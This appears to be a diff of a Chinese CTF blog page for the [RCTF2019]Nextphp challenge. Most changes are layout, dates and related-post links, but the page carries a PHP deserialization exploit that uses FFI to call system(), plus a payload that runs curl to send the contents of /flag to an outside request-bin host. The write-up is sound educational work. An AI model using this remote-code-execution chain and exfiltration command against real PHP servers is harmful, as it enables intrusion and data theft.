@@ -117,12 +117,12 @@ zty153’s_blog = 网安 = web学习</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?361133"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?443087"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?267869"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?733577"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?803183"></li>
-          <li class="item" data-background-image="https://www.loliapi.com/acg/?300324"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?914336"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?713147"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?461143"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?785190"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?438845"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?91198"></li>
         </ul>
       </div>
     </header>
@@ -230,29 +230,7 @@ zty153’s_blog = 网安 = web学习</title>
 <p>注：我们在写 exp 的时候，删掉没有必要的魔术方法 以及前面提到的 __serialize () 和</p>
 <p>因为 __serialize () 存在的话，serialize 构造好的类实例对象就不会调用 serialize (). $this-&gt;data 就不会再进行一下 serialize 再返回。因此 我们执行过程中第一步的参数 payload 就不会是恶意 data 数组序列化数据。<br />
 exp 如下：</p>
-<pre><code>&lt;?php
-final class A implements Serializable &#123;
-    protected $data = [
-        'ret' =&gt; null,
-        'func' =&gt; 'FFI::cdef',
-        'arg' =&gt; 'int system(const char *command);'     //声明
-    ];
-
-    public function serialize (): string &#123;
-        return serialize($this-&gt;data);
-    &#125;
-     
-    public function unserialize($payload) &#123;
-        $this-&gt;data = unserialize($payload);
-    &#125;
-
-&#125;
-
-$a = new A();
-echo serialize($a);
-
-</code></pre>
-<p>payload1（数据 外带）（推荐网站：<span class="exturl" data-url="aHR0cHM6Ly93ZWJob29rLnNpdGUvJUVGJUJDJTg5JUVGJUJDJTlB">https://webhook.site/）：</span></p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'int system(const char *command);'</span>     <span class="token comment">// 声明</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>     </pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></pre></td></tr></table></figure><p>payload1（数据 外带）（推荐网站：<span class="exturl" data-url="aHR0cHM6Ly93ZWJob29rLnNpdGUvJUVGJUJDJTg5JUVGJUJDJTlB">https://webhook.site/）：</span></p>
 <pre><code>?a=$a=unserialize(base64_decode(&quot;QzoxOiJBIjo5Nzp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czozNDoiaW50IHBocF9leGVjKGludCB0eXBlLCBjaGFyICpjbWQpOyI7fX0=&quot;));var_dump($a-&gt;ret-&gt;php_exec(2,%27curl%20http://http.requestbin.buuoj.cn/1f4vjz01?a=`cat%20/flag`%27));
 </code></pre>
 <p>payload2（这个是上面的解释的续版）（也算是数据外带的吧）：</p>
@@ -276,7 +254,7 @@ echo serialize($a);
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2024-10-20 19:43:39" itemprop="dateModified" datetime="2024-10-20T19:43:39+08:00">2024-10-20</time>
+    <time title="Modified: 2025-10-10 10:51:34" itemprop="dateModified" datetime="2025-10-10T10:51:34+08:00">2025-10-10</time>
   </span>
   <span id="2024/10/17/RCTF2019-Nextphp/" class="item leancloud_visitors" data-flag-title="[RCTF2019]Nextphp" title="Views">
       <span class="icon">
@@ -339,7 +317,7 @@ echo serialize($a);
     <div class="item left">
       
 
-  <a href="/2024/10/15/FBCTF2019-Event/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?61516" title="[FBCTF2019]Event">
+  <a href="/2024/10/15/FBCTF2019-Event/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?459572" title="[FBCTF2019]Event">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[FBCTF2019]Event</h3>
@@ -349,7 +327,7 @@ echo serialize($a);
     <div class="item right">
       
 
-  <a href="/2024/10/17/BSidesCF-2019-PickTacToe/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?568961" title="[BSidesCF2019]Pick Tac Toe">
+  <a href="/2024/10/17/BSidesCF-2019-PickTacToe/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?931556" title="[BSidesCF2019]Pick Tac Toe">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
   <h3>[BSidesCF2019]Pick Tac Toe</h3>
@@ -456,7 +434,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/09/22/NPUCTF2020-ezlogin/" title="[NPUCTF2020]ezlogin">[NPUCTF2020]ezlogin</a></span>
+    <span><a href="/2024/05/27/buuctf5%E6%9C%8827%E6%97%A5/" title="[红明谷CTF 2021]write_shell">[红明谷CTF 2021]write_shell</a></span>
   </li>
 
       
@@ -466,7 +444,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/12/10/De1CTF-2019-Giftbox/" title="[De1CTF_2019]Giftbox">[De1CTF_2019]Giftbox</a></span>
+    <span><a href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/" title="[羊城杯2020]EasySer">[羊城杯2020]EasySer</a></span>
   </li>
 
       
@@ -476,7 +454,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></span>
+    <span><a href="/2024/06/02/2017-SSRFme/" title="‘’[HITCON 2017]SSRFme‘’">‘’[HITCON 2017]SSRFme‘’</a></span>
   </li>
 
       
@@ -486,7 +464,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/04/28/3-txt/" title="buuctf4月27日">buuctf4月27日</a></span>
+    <span><a href="/2024/06/03/GYCTF2020-Ezsqli/" title="&#39;[GYCTF2020]Ezsqli&#39;">'[GYCTF2020]Ezsqli'</a></span>
   </li>
 
       
@@ -496,7 +474,17 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/08/19/bestphp-srevenge/" title="bestphp&#39;srevenge">bestphp'srevenge</a></span>
+    <span><a href="/2025/02/23/HFCTF-2021-Final-hatenum/" title="[HFCTF_2021_Final]hatenum">[HFCTF_2021_Final]hatenum</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2024/03/31/xss%E7%AC%94%E8%AE%B0/" title="xss漏洞学习笔记">xss漏洞学习笔记</a></span>
   </li>
 
       
@@ -506,7 +494,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2025/02/26/HMGCTF2022-Fan-Website/" title="[HMGCTF2022]Fan_Website">[HMGCTF2022]Fan_Website</a></span>
+    <span><a href="/2024/10/15/CSAWQual2016-i-got-id/" title="[CSAWQual2016]i_got_id">[CSAWQual2016]i_got_id</a></span>
   </li>
 
       
@@ -516,7 +504,19 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></span>
+    <span><a href="/2024/08/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFUpload%E9%A2%98/" title="2019强网杯Upload题">2019强网杯Upload题</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/06/08/%5BSWPUCTF%202018%5DSimplePHP/" title="SWPUCTF——2018SimplePHP">SWPUCTF——2018SimplePHP</a></span>
   </li>
 
       
@@ -526,27 +526,7 @@ echo serialize($a);
 <a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
 </div>
 
-    <span><a href="/2025/02/24/SWPUCTF-2016-Web7/" title="[SWPUCTF_2016]Web7">[SWPUCTF_2016]Web7</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/06/11/HarekazeCTF2019-encode-and-encode/" title="[HarekazeCTF2019]encode_and_encode">[HarekazeCTF2019]encode_and_encode</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
-</div>
-
-    <span><a href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/" title="[极客大挑战2020]Roamphp2-Myblog">[极客大挑战2020]Roamphp2-Myblog</a></span>
+    <span><a href="/2024/10/17/HITCON2016-Leaking/" title="[HITCON2016]Leaking">[HITCON2016]Leaking</a></span>
   </li>
 
   </ul>
@@ -571,13 +551,13 @@ echo serialize($a);
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="Symbols count total">683k words</span>
+    <span title="Symbols count total">697k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="Reading time total">10:21</span>
+    <span title="Reading time total">10:34</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
